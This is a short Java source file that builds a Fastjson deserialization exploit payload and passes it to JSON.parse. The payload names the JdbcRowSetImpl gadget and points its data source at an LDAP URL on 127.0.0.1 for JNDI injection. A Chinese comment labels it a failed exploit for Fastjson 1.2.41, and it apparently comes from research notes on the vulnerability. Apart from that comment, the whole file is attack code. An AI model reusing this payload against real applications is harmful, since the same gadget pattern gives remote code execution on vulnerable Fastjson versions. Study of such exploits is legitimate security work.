import com.alibaba.fastjson.JSON;

// 对于 Fastjson 1.2.41 的版本，失败的 EXP
public class FailedEXP {
    public static void main(String[] args) {
        String payload ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1234/ExportObject\",\"autoCommit\":\"true\" }";
        JSON.parse(payload);
    }
}
